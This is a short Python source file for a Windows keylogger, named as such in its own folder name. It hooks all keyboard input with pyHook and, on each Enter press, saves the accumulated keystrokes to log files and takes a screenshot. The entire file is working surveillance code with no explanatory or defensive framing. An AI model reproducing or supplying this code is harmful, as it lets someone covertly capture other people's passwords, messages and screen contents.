import pyHook, pythoncom,uuid
from autopy import bitmap
import os
text = ""
i = 0
def key_down(event):
	#print event.Key
	global text
	global i
	x = event.Key
	if x == 'Space':
		x=' '
	if x != 'Back':
		text+=x
	if event.Key == 'Return':
		i+=1
		if os.path.exists('KeyLogger')==False:
			os.mkdir('KeyLogger')
		img = bitmap.capture_screen()
		img.save("KeyLogger/"+str(uuid.uuid4())+".png")
		file = open("KeyLogger/log"+str(i)+".txt",'a')
		file.write(text)
		file.close()

hook = pyHook.HookManager()
hook.KeyDown = key_down
hook.HookKeyboard()
pythoncom.PumpMessages()



#while True:

